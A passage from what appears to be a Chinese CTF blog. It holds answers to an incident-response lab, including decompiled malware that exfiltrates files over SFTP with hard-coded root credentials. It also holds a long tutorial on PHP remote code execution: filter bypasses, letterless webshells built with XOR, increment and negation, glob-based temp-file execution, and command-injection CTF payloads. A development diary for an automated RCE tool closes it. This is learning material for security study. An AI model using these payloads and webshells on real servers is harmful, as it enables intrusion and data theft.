33. 提交攻击者使用内网扫描工具的哈希格式为:[xxxx] history fscan md5值 34. 请提交攻击者在站点上留下的后门密码格式为:[xxxx] index.php eval($_[123]) 202cb962ac59075b964b07152d234b70 35. 请提交攻击者在数据库留下的信息格式为:[xxxx] 192.168.20.52 用户名:mysql密码:mysql1234 36. 提交攻击者在监控服务器上留下的dcnlog地址格式为:[xxx.xx.xx] 192.168.20.52 用户名:mysql密码:mysql1234 zabbix的auditlog表里面就有dnslog地址，反弹shell是表记录里面有一个python反弹shell，base64解码 37. 提交监控服务器上恶意用户的上一次登录时间格式为:[xx/xx/xx/xx:xx:xx] 38. 提交监控服务器上遗留的反弹shell地址和端口格式为:[xxxx:xx] 192.168.20.52 用户名:mysql密码:mysql1234 反弹shell是表记录里面有一个python反弹shell，base64解码 39. 提交恶意钓鱼文件的哈希格式为:[xxxx] [da75025ff7f3b6baa27f5913c1c83063] 40. 提交恶意文件外联IP格式为:[xxx] 41. 提交被恶意文件钓鱼使用者的姓名格式为:[xxx] 42. 提交攻击者留下的信息格式为:[xxxx] 注册表打开就有flag 43. 提交恶意用户数量格式为:[md5(xxxx)] PC02 admin00-admin19 + guest + dev00-dev19+sale00-sale08 = 49 md5(49) = f457c545a9ded88f18ecee47145a72c0 44. 请提交员工集体使用的密码格式为:[xxxx] 登录其他账户测试一下 45. 提交加密文件的哈希格式为:[xxxx] [2bf71a0d6d4e70cec7602da2b653e2ab] 46. 提交被攻击者加密的内容明文格式为:[xxxx] 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990 import re encoding_rules = &#123; &#x27;a&#x27;: &#x27;玛卡巴卡轰&#x27;, &#x27;b&#x27;: &#x27;阿巴雅卡轰&#x27;, &#x27;c&#x27;: &#x27;伊卡阿卡噢轰&#x27;, &#x27;d&#x27;: &#x27;哈姆达姆阿卡嗙轰&#x27;, &#x27;e&#x27;: &#x27;咿呀呦轰&#x27;, &#x27;f&#x27;: &#x27;玛卡雅卡轰&#x27;, &#x27;g&#x27;: &#x27;伊卡阿卡轰&#x27;, &#x27;h&#x27;: &#x27;咿呀巴卡轰&#x27;, &#x27;i&#x27;: &#x27;达姆阿卡嗙轰&#x27;, &#x27;j&#x27;: &#x27;玛卡巴卡玛卡巴卡轰&#x27;, &#x27;k&#x27;: &#x27;玛卡巴卡玛卡巴卡玛卡巴卡轰&#x27;, &#x27;l&#x27;: &#x27;玛卡巴卡玛卡巴卡玛卡巴卡玛卡巴卡轰&#x27;, &#x27;m&#x27;: &#x27;阿巴雅卡阿巴雅卡轰&#x27;, &#x27;n&#x27;: &#x27;阿巴雅卡阿巴雅卡阿巴雅卡轰&#x27;, &#x27;o&#x27;: &#x27;阿巴雅卡阿巴雅卡阿巴雅卡阿巴雅卡轰&#x27;, &#x27;p&#x27;: &#x27;伊卡阿卡噢伊卡阿卡噢轰&#x27;, &#x27;q&#x27;: &#x27;伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰&#x27;, &#x27;r&#x27;: &#x27;伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢伊卡阿卡噢轰&#x27;, &#x27;s&#x27;: &#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;, &#x27;t&#x27;: &#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;, &#x27;u&#x27;: &#x27;哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙哈姆达姆阿卡嗙轰&#x27;, &#x27;v&#x27;: &#x27;咿呀呦咿呀呦轰&#x27;, &#x27;w&#x27;: &#x27;咿呀呦咿呀呦咿呀呦轰&#x27;, &#x27;x&#x27;: &#x27;咿呀呦咿呀呦咿呀呦咿呀呦轰&#x27;, &#x27;y&#x27;: &#x27;咿呀呦咿呀呦咿呀呦咿呀呦咿呀呦轰&#x27;, &#x27;z&#x27;: &#x27;玛卡雅卡玛卡雅卡轰&#x27;, &#x27;A&#x27;: &#x27;玛卡雅卡玛卡雅卡玛卡雅卡轰&#x27;, &#x27;B&#x27;: &#x27;玛卡雅卡玛卡雅卡玛卡雅卡玛卡雅卡轰&#x27;, &#x27;C&#x27;: &#x27;伊卡阿卡伊卡阿卡轰&#x27;, &#x27;D&#x27;: &#x27;伊卡阿卡伊卡阿卡伊卡阿卡轰&#x27;, &#x27;E&#x27;: &#x27;伊卡阿卡伊卡阿卡伊卡阿卡伊卡阿卡轰&#x27;, &#x27;F&#x27;: &#x27;咿呀巴卡咿呀巴卡轰&#x27;, &#x27;G&#x27;: &#x27;咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;, &#x27;H&#x27;: &#x27;咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;, &#x27;I&#x27;: &#x27;咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡咿呀巴卡轰&#x27;, &#x27;J&#x27;: &#x27;达姆阿卡嗙达姆阿卡嗙轰&#x27;, &#x27;K&#x27;: &#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;, &#x27;L&#x27;: &#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;, &#x27;M&#x27;: &#x27;达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙达姆阿卡嗙轰&#x27;, &#x27;N&#x27;: &#x27;巴卡巴卡轰&#x27;, &#x27;O&#x27;: &#x27;巴卡巴卡巴卡巴卡轰&#x27;, &#x27;P&#x27;: &#x27;巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;, &#x27;Q&#x27;: &#x27;巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;, &#x27;R&#x27;: &#x27;巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡巴卡轰&#x27;, &#x27;S&#x27;: &#x27;呀呦轰&#x27;, &#x27;T&#x27;: &#x27;呀呦呀呦轰&#x27;, &#x27;U&#x27;: &#x27;呀呦呀呦呀呦轰&#x27;, &#x27;V&#x27;: &#x27;呀呦呀呦呀呦呀呦轰&#x27;, &#x27;W&#x27;: &#x27;呀呦呀呦呀呦呀呦呀呦轰&#x27;, &#x27;X&#x27;: &#x27;达姆阿卡轰&#x27;, &#x27;Y&#x27;: &#x27;达姆阿卡达姆阿卡轰&#x27;, &#x27;Z&#x27;: &#x27;达姆阿卡达姆阿卡达姆阿卡轰&#x27;, &#x27;0&#x27;: &#x27;达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰&#x27;, &#x27;1&#x27;: &#x27;达姆阿卡达姆阿卡达姆阿卡达姆阿卡达姆阿卡轰&#x27;, &#x27;2&#x27;: &#x27;玛巴轰&#x27;, &#x27;3&#x27;: &#x27;玛巴玛巴轰&#x27;, &#x27;4&#x27;: &#x27;玛巴玛巴玛巴轰&#x27;, &#x27;5&#x27;: &#x27;玛巴玛巴玛巴玛巴轰&#x27;, &#x27;6&#x27;: &#x27;巴卡玛巴轰&#x27;, &#x27;7&#x27;: &#x27;巴卡玛巴巴卡玛巴轰&#x27;, &#x27;8&#x27;: &#x27;巴卡玛巴巴卡玛巴巴卡玛巴轰&#x27;, &#x27;9&#x27;: &#x27;巴卡玛巴巴卡玛巴巴卡玛巴巴卡玛巴轰&#x27;, &#x27;=&#x27;: &#x27;妈个巴子轰&#x27;, &#x27;/&#x27;: &#x27;妈个巴卡轰&#x27;, &#x27;+&#x27;: &#x27;妈个巴达轰&#x27;, &#125; def decodemaba(miwen): mingwen=&#x27;&#x27; # print(f&#x27;密文&#123;&#123;miwen&#125;&#125;&#x27;) result = re.split(r&#x27;(?&lt;=轰)&#x27;, miwen) # print(result) for it in result: # print(it) for key,val in encoding_rules.items(): # print(val) if it==val: # print(&quot;找到明文密码&quot;) # print(key) mingwen = str(mingwen)+str(key) print(mingwen)​ decodemaba(&quot;密文&quot;) 47. 请提交符合基线标准的服务器数量格式为:[md5(xx)] 所有服务器存在漏洞,符合基线数量为0. `cfcd208495d565ef66e7dff9f98764da` 48. 提交办公区的恶意文件哈希格式为:[xxx] 49. 提交恶意回连端口格式为:[xxx] python文件反编译 反编译pyc 123456789101112131415161718192021222324252627282930313233 #!/usr/bin/env python # visit https://tool.lu/pyc/ for more information # Version: Python 3.8 import os import paramiko from getpass import getpass def search_in_files(directory, search_text): pass # WARNING: Decompyle incomplete​ def ssh(local_file_path, remote_file_path): hostname = &#x27;192.168.20.123&#x27; port = 22 username = &#x27;root&#x27; password = &#x27;Network@2020&#x27; client = paramiko.SSHClient() client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) client.connect(hostname, port, username, password) sftp = client.open_sftp() sftp.put(local_file_path, remote_file_path) sftp.close() client.close() print(f&#x27;&#x27;&#x27;File &#123;local_file_path&#125; uploaded to &#123;remote_file_path&#125; on &#123;hostname&#125;&#x27;&#x27;&#x27;) flag = &#x27;flag&#123;234567uyhgn_aiduyai&#125;&#x27; search_directory = &#x27;/&#x27; search_for_text = &#x27;passwod&#x27; (a, b) = search_in_files(search_directory, search_for_text) ssh(a, b) 50. 提交恶意程序中的falg格式为:[xxx] 49题源码 flag&#123;234567uyhgn\\_aiduyai&#125; 51. 提交恶意文件中的search_for_text内容 格式为:[xxxx] 49题源码 search\\_for\\_text = 'passwod'"},{"title":"从0到1，AKRCE之旅","path":"2024/03/08/rce/","text":"RCE全解 观前提示: 本文章主讲php中的RCE各种方法,Java的RCE我会在未来再写一篇文章 漏洞概述 常见漏洞函数 系统命令执行函数 bash命令 代码执行函数 绕过 空格过滤: 函数过滤: 黑名单绕过: 内联执行 截取环境变量拼接 截取环境变量拼接进阶 无数字字母 利用$ 常规 php5 异或 自增 php7 异或 补充 无数字字母进阶 php7 php5 一些特殊题目 路漫漫其修远兮 吾将上下而求索 漏洞概述 在Web应用开发中为了灵活性、简洁性等会让应用调用代码执行函数或系统命令执行函数处理，若应用对用户的输入过滤不严，容易产生远程代码执行漏洞或系统命令执行漏洞； 常见漏洞函数 系统命令执行函数 12345678system()：能将字符串作为OS命令执行，且返回命令执行结果； exec()：能将字符串作为OS命令执行，但是只返回执行结果的最后一行(约等于无回显)； shell_exec()：能将字符串作为OS命令执行 passthru()：能将字符串作为OS命令执行，只调用命令不返回任何结果，但把命令的运行结果原样输出到标准输出设备上； popen()：打开进程文件指针 proc_open()：与popen()类似 pcntl_exec()：在当前进程空间执行指定程序； 反引号``：反引号``内的字符串会被解析为OS命令 bash命令 1234567891011121314151617181920212223242526more:一页一页的显示档案内容less:与 more 类似head:查看头几行tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示tail:查看尾几行nl：显示的时候，顺便输出行号od:以二进制的方式读取档案内容vi:一种编辑器，这个也可以查看vim:一种编辑器，这个也可以查看sort:可以查看uniq:可以查看ls：查看目录dir：查看目录grep:wget:sed: cut:awk:strings:od:curl:scp:xxd:mv: cp:pwd: 代码执行函数 12345678eval()：将字符串作为php代码执行； assert()：将字符串作为php代码执行； preg_replace()：正则匹配替换字符串； create_function()：主要创建匿名函数； call_user_func()：回调函数，第一个参数为函数名，第二个参数为函数的参数； call_user_func_array()：回调函数，第一个参数为函数名，第二个参数为函数参数的数组； 可变函数：若变量后有括号，该变量会被当做函数名为变量值(前提是该变量值是存在的函数名)的函数执行； 绕过 空格过滤: &lt; &lt;&gt; %09 %0a $IFS$9 ${IFS} $IFS %0d 函数过滤: 1234使用\\绕过 如:ca\\t fla\\gl\\s使用&#x27;&#x27;绕过,如:ca&#x27;&#x27;t /flag 还可以使用通配符,*是匹配所有,比如flag.txt可以使用*.*来匹配,但是这样无法精确匹配到flag.txt,所以我们可以使用另一个通配符?,这个可以匹配单个内容,比如????.???就可以匹配到flag.txt,可以理解为万能字符 黑名单绕过: 1234567891011var_dump()输出变量file_get_contents() 读文件get_defined_vars() 读变量next() 对数组操作array_pop() 弹出数组rename() 重命名eval(var_dump(scandir(&#x27;/&#x27;););//读取根目录cat `ls`//等效于打开ls目录下的文件_被过滤可用&#x27;[&#x27;代替分号过滤使用?&gt;闭合show_source(next(array_reverse(scandir(pos(localeconv()))))); 123456789//glob伪协议读文件(适用于ls被限制):$a=&#x27;glob:///*&#x27;;$b=opendir($a);if($b)&#123; while(($file=readdir($b))!==false)&#123; echo $file; &#125; closedir($b);&#125;exit(); 12变量覆盖:?rce=eval($_GET[1]);&amp;1=phpinfo(); 内联执行 echo ls echo ${ls} 相当于把ls的结果使用echo输出 截取环境变量拼接 当所有函数都被过滤时,利用/var/www/html和/bin/sh构造函数绕过,如ls,nl $&#123;PATH:~0&#125;代表取环境变量最后一位,在/binzhon中就是’n’,$&#123;PWD:~0&#125;代表取系统变量最后一位,在/var/www/html中就是l,这样即可构造出nl 截取环境变量拼接进阶 在php中有一个系统变量 PHP_CFLAGS=-fstack-protectcor-strong-fpic-fpie-o2-D_LARGEFILE_SOURCE -D_FI LE_OFFSET_BITS=64 还可以利用php的版本号,例如7.3.22 中的3来构造tac 1$&#123;PHP_CFLAGS:$&#123;PHP_VERSION:$&#123;PHP_VERSION:~A&#125;:~$&#123;SHLVL&#125;&#125;:$&#123;PHP_VERS ION:$&#123;PHP_VERSION:~A&#125;:~$&#123;SHLVL&#125;&#125;&#125; 其中$&#123;PHP_VERSION:$&#123;PHP_VERSION:~A&#125;代表3,所以等于$&#123;PHP_CFLAGS:3:3&#125;也就是tac 还有另外一种比较特别的思路,构造/和t,然后使用通配符构造/bin/cat 这里不知道为什么放不出来,只能贴图了 虽然大部分情况下以上内容足够完成题目,但若出现无数字字母的RCE题目就要看下面的了 无数字字母 对于一些基础的无数字字母RCE,可以使用探姬大佬的工具bashfuck 利用$ 在只限制了字母数字的情况下，我们可以利用shell脚本中$的各种用法 变量名 含义 $0 脚本本身的名字 $1 脚本后所输入的第一串字符 $2 传递给该shell脚本的第二个参数 $* 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’ $@ 脚本后所输入的所有字符’westos’ ‘linux’ ‘lyq’ $_ 表示上一个命令的最后一个参数 $# #脚本后所输入的字符串个数 $$ 脚本运行的当前进程ID号 $! 表示最后执行的后台命令的PID $? 显示最后命令的退出状态，0表示没有错误，其他表示由错误 Linux变量$_,它存储着上次程序传入的参数，比如执行echo can you get the file of tmp命令后，再执行echo $_，发现结果是tmp。 由此有大佬出来一个题目,因为要使用报错信息回显,所以加上了2&gt;&amp;1,预期解是?command=. /$_ 原理就是用点号+空格+文件名执行一个可执行文件，等效于source可执行文件，然后我们前面echo了一次flag，flag作为了最后一个参数，因此可以用$_代替这个flag，但又因为我们这个flag不是可执行文件，因此linux就会报错，然后打印并输出这个文件里的内容，类似于用date -f越权读文件一样 123456789101112131415&lt;?php if(isset($_GET[&#x27;command&#x27;]))&#123; $command = $_GET[&#x27;command&#x27;]; if(strlen($command)&gt;5)&#123; die(&quot;Too Long!&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$command))&#123; die(&quot;No letters or numbers!&quot;); &#125; eval(system(&quot;echo you are not able to get flag;$command 2&gt;&amp;1&quot;));&#125;else&#123; highlight_file(__FILE__);&#125; ?&gt; 常规 转载p牛的文章一些不包含数字和字母的webshell 1234&lt;?phpif(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123; eval($_GET[&#x27;shell&#x27;]);&#125; 题目是这样的,非常经典的无数字字母rce,思路是要利用各种符号构造字符然后拼接函数实现rce,但php5与7中assert()函数是有区别的,在php5中,assert是一个函数,我们可以通过$f='assert';$f(phpinfo());这样的方法来动态执行任意代码。 但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。 在p牛的文章中,他使用php5作为环境,但在我们的文章中,就必须两个同时写出(也是记录自己学习的过程) php5 异或 使用异或构造assert，例如 12345&lt;?php$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;$___=$$__;$_($___[_]); // assert($_POST[_]); 这里放个自己写的遍历脚本,要哪个字符输入即可（可遍历所有字符）(看了大佬的文章就想要是一个个找字符也太慢了,于是就写了个脚本) 12345678910111213141516171819202122232425&lt;?php$input = readline(&quot; 请输入字符: &quot;);for ($i = 0; $i &lt; strlen($input); $i++) &#123; for ($a=0; $a &lt;= 15; $a++)&#123; for ($b=0; $b &lt;= 15; $b++)&#123; $current_char = $input[$i]; $c = &#x27;%&#x27; . dechex($a) . dechex($b); //10进制转16进制 $decoded = urldecode(&#x27;&#x27;.$c.&#x27;&#x27;); //两次单引号,不然没法写 $decoded_ascii = ord($decoded); //求$curl解码之后的ascii数 $backtick_ascii = ord(&#x27;`&#x27;); //求`的ascii数 $result = $decoded_ascii ^ $backtick_ascii; //异或 if (chr($result) == $current_char) &#123; echo &quot;$current_char ===&gt; $c\\n&quot;; continue; &#125; &#125; &#125;&#125;?&gt; 自增 关于不使用位运算的方法，取反没写是没看懂QAQ 这就得借助PHP的一个小技巧，先看文档： http://php.net/manual/zh/language.operators.increment.php 也就是说，‘a’++ =&gt; ‘b’，‘b’++ =&gt; ‘c’… 所以，我们只要能拿到一个变量，其值为a，通过自增操作即可获得a-z中所有字符。那么，如何拿到一个值为字符串’a’的变量呢？ 巧了，数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array 再取这个字符串的第一个字母，就可以获得’A’了。利用这个技巧，编写如下webshell（因为PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($_POST[_])，无需获取小写a）： 1234567891011121314151617181920212223242526272829303132333435&lt;?php$_=[];$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____=&#x27;_&#x27;;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); // ASSERT($_POST[_]); php7 在php7中… 不是都php7了为什么不看下面无数字字母进阶里的一行极简写法，一个非常简单的取反解法，而且基本通杀，为什么还要研究这个又费劲限制又大的东西呢 开玩笑，该写还是得写的,喜欢用哪个自己选哈 php5中有用assert动态执行的方法，但php7中没有了，而是使用($a)();这类代码动态执行函数，p牛在文章中举例可以利用file_put_contents函数getshell，这是一个能写入文件的函数，所以我们可以利用这个构造一个shell文件 异或 12345678910&lt;?php$_=(&#x27;%06&#x27;^&#x27;`&#x27;).(&#x27;%09&#x27;^&#x27;`&#x27;).(&#x27;%0c&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).&#x27;_&#x27;.(&#x27;%10&#x27;^&#x27;`&#x27;).(&#x27;%15&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;).&#x27;_&#x27;.(&#x27;%03&#x27;^&#x27;`&#x27;).(&#x27;%0f&#x27;^&#x27;`&#x27;).(&#x27;%0e&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%0e&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;);//$_=file_put_contents$__=(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%03&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).&#x27;.&#x27;.(&#x27;%10&#x27;^&#x27;`&#x27;).(&#x27;%08&#x27;^&#x27;`&#x27;).(&#x27;%10&#x27;^&#x27;`&#x27;);//$__=rce.php$___=(&#x27;%10&#x27;^&#x27;`&#x27;).(&#x27;%08&#x27;^&#x27;`&#x27;).(&#x27;%10&#x27;^&#x27;`&#x27;).(&#x27;%09&#x27;^&#x27;`&#x27;).(&#x27;%0e&#x27;^&#x27;`&#x27;).(&#x27;%06&#x27;^&#x27;`&#x27;).(&#x27;%0f&#x27;^&#x27;`&#x27;);//$___=phpinfo$____=$_($__,$___());//$____=file_put_contents(rce.php,phpinfo());?&gt; 成功！ 补充 来自: https://www.freebuf.com/articles/network/279563.html 这里还需要介绍一种特殊的方法，无版本限制，因为本质是用异或构造_GET然后传参rce 当 ; 被过滤时,还可以使用短标签绕过 不知道为什么放不出来代码，只能用图片了 无数字字母进阶 关于进阶版,依然还是要推荐p牛的文章,本文章也就是用自己的话重复了一遍p牛的文章而已 无字母数字webshell之提高篇 12345678910111213&lt;?phpif(isset($_GET[&#x27;code&#x27;]))&#123; $code = $_GET[&#x27;code&#x27;]; if(strlen($code)&gt;35)&#123; die(&quot;Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; eval($code);&#125;else&#123; highlight_file(__FILE__);&#125; 题目如上，_和$被过滤了，而且限制长度，所以显然，上面的异或等需要使用$和_的payload用不了了，只能使用一些奇技淫巧。 php7 首先来说简单的，在php7中，可以利用($a)();这类的payload执行动态函数。 所以只需要构造一个取反后为命令的payload即可, 例如phpinfo取反后为%8F%97%8F%96%91%99%90, 那么payload为(~%8F%97%8F%96%91%99%90)(); 即可执行phpinfo()。 而如果要执行system, 则只需要在第一个括号中输入system取反, 第二个括号中输入system命令即可, 比如system(ipconfig)的payload为(~%8C%86%8C%8B%9A%92)(~%96%8F%9C%90%91%99%96%98); 这里也挂一个脚本方便转换,不可见字符进行了url编码 12345678910111213141516171819202122import urllib.parsedef construct_string(): target_string = input(&quot;请输入要转换的字符: &quot;) # 计算目标字符串的字节流 target_bytes = bytes(target_string, &#x27;latin1&#x27;) # 计算取反后的字节流 inverted_bytes = bytes(~byte &amp; 0xff for byte in target_bytes) # 将取反后的字节流转换为字符串 inverted_string = inverted_bytes.decode(&#x27;latin1&#x27;, errors=&#x27;replace&#x27;) # 对不可见字符进行 URL 编码 encoded_string = &#x27;&#x27;.join(urllib.parse.quote(char) if char not in &#x27; \\t\\n\\r\\f\\v&#x27; else char for char in inverted_string) # 移除字符串中的 &#x27;%C2&#x27; encoded_string = encoded_string.replace(&#x27;%C2&#x27;, &#x27;&#x27;) return encoded_stringdef main(): constructed_string = construct_string() print(&quot;result：&quot;, constructed_string)if __name__ == &quot;__main__&quot;: main() php5 在php5中,并没有php7中那种表达方式,因此上面的payload并不可以. 在Linux中,有两个关于shell的知识点: shell下可以利用.来执行任意脚本 Linux文件名支持用glob通配符代替 . 的作用与source一样,就是用当前shell执行一个文件,那么如果服务器上有一个我们可控的文件,就可以使用.getshell了。这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。但若要执行这个文件,也需要字母,所以这时候就需要用到glob通配符了。但我们如果执行. /???/?????????，便会出现错误 原因是匹配到的文件太多了，因此在执行第一个文件时就会报错，所以我们必须匹配到/tmp/phpxxxxxx这个文件。 上传一个文件我们可以发现，文件名是含有大小写的，而刚才ls出来的文件并没有大写的，所以我们可以根据大写字母来下手，使用通配符匹配大写即可，翻开ascii表，可见大写字母位于@和[之间，因此我们可以使用[@-[]来匹配大写字符。 可以匹配成功。 因此我们发包传文件然后在code中输入payload即可 1?code=?&gt;&lt;?=`. /???/????????[@-[]`;?&gt; 如果@被过滤,可以使用它前面的:;&lt;=&gt;?这几个来进行绕过虽然最后一个不一定是大写字母，但是多试几次就可以了 一些特殊题目 题目：2024 N1CTF 中web方向解题最多的zako（php） 大佬博客 2024 N1CTF Junior Web Writeup 以我这种小菜鸡的实力肯定是解不出来了，赛后看了Boogipop大神（ak了）的wp发现了这个有趣的解法，决定将它写在我的这篇文章中题目内容: 一个sh脚本,设置了白名单,只有两个函数能用ls和grep 还有一个黑名单,过滤了;&amp;$()&#123;&#125;[]!@#$%^&amp;*-和反引号(没法打这里了) 12345678910111213141516&lt;?php//something hide herehighlight_string(shell_exec(&quot;cat &quot;.__FILE__.&quot; | grep -v preg_match | grep -v highlight&quot;));$cmd = $_REQUEST[&quot;__secret.xswl.io&quot;];if (strlen($cmd)&gt;70) &#123; die(&quot;no, &gt;70&quot;);&#125;if (preg_match(&quot;/(&#x27;|`|\\n|\\t|\\\\\\$|~|@|#|;|&amp;|\\\\||-|_|\\\\=|\\\\*|!|\\\\%|\\\\\\^|index|execute&#x27;)/is&quot;,$cmd))&#123; die(&quot;你就不能绕一下喵&quot;);&#125;system(&quot;./execute.sh &#x27;&quot;.$cmd.&quot;&#x27;&quot;);?&gt; 这里有两层waf,一个是php里的,一个在shell中,因此,大佬选择利用grep构造一个php文件绕过 1234&lt;?php$cmd = $_REQUEST[&quot;__secret.xswl.io&quot;];system(&quot;./execute.sh &#x27;&quot;.$cmd.&quot;&#x27;&quot;);?&gt; 依次输入命令: 123grep &quot;&lt;?php&quot; inde?.php &gt;&gt; pop.phpgrep &quot;cmd&quot; inde?.php &gt;&gt; pop.phpgrep &quot;system&quot; inde?.php &gt;&gt; pop.php 然后读取一下pop.php即可了最终在pop.php中payload为ls';cat /flag',第一个'闭合了.execute.sh,然后使用;拼接命令,最终用最后一个'闭合最后的单引号原理解析: 第一行命令grep &quot;&lt;?php&quot; inde?.php &gt;&gt; pop.php将index.php中带有&lt;?php的一行写入pop.php中, 第二行命令将带有cmd的一行,即$cmd = $_REQUEST[&quot;__secret.xswl.io&quot;];写入,最后用第三行将system(&quot;./execute.sh '&quot;.$cmd.&quot;'&quot;);写入完成RCE。 路漫漫其修远兮 吾将上下而求索 无数字字母这一块基本都是转载的p神的文章（惭愧），也是从p神的文章中学到了很多知识，这里还是必须推一下p牛的博客，篇篇文章都是知识啊 p神的博客 通过自己写了这篇文章之后，自己以后再遇到rce题就会有一个基本思路了，这几天在学校也净思考RCE这一块东西了，自己关于p神的博客整了几个脚本，对于自己的项目应该还是能有点帮助从0到1，RCEmap开发之旅 还有Boogipop爷的思路，非常有趣，利用grep将给出题目的源码写入另一个文件中以绕过index.php中的过滤，学习到了。大B哥的博客 我知道这篇文章没有写全所有的RCE的内容，但是php中的RCE题目差不多就是这些了，本人还很菜，没有一些深刻的理解，如有错误的地方，请多多指正。"},{"title":"从0到1，RCEmap开发之旅","path":"2024/03/04/RCEmap/","text":"使用Golang进行开发，2024年3月4日立项,3月13日开始 从0到1，RCEmap开发之旅 灵感来源：sqlmap 前置学习任务： go，python的基础 图形化制作 sqlmap源码分析，运行逻辑分析 RCE绕过方法全解（详见我的RCE全解） 反序列化（因为我想整个自动化反序列化） 目标： 支持多语言RCE题目，如php, java，的过滤绕过与自动执行指定命令 各框架（如thinkPHP）RCE漏洞自动打poc GUI大致思路（借鉴xray）： 多个阶段 第一阶段： 无GUI的php版RCEmap 第二阶段： 有GUI版本第三阶段： 带Java的版本最终阶段： 带各框架漏洞的自动化RCE工具 开发日记 三月 3月13日晚 3月14日 3月15日晚 3月16日 3月17日 3月21日 3月27日 四月 4月1日 4月9日(没有更新，是思考) 4月15日 4月17日 开发笔记（未完待续） 起因 起步阶段 环境变量设置 前置问题 编写主程序 GUI部分 开头杂谈 浅浅干货 自动模式完结 手动模式 开发日记 项目指路 三月 3月13日晚 正式动手编写，计划三月内实现第一阶段。 今天实现了logo的输出和访问url并查找过滤的功能，但并未去除html标签，需要goquery这个第三方库，还没整，明天回来继续。 3月14日 我新机箱到了，安机箱来着，没整，明天周五回来得学习学校知识，周六的吧效果预览： 3月15日晚 太无聊了也没学学校的东西，兴趣使然更新了点东西，能够初步识别无数字字母过滤，后面还有一大堆东西，比如针对无数字字母进阶版，以及其他的一些小过滤，还有需要自己fuzz的过滤，以及对php版本的识别，一般来讲可以使用Wappalyzer直接查看php版本，但是代码里还没法实现，等我后面再学学 效果预览2： 3月16日 实现了在php7.x环境下的无数字字母rce进阶版，能够在用户输入url，参数点，命令的情况下自动返回结果，可用字符：( ) ; 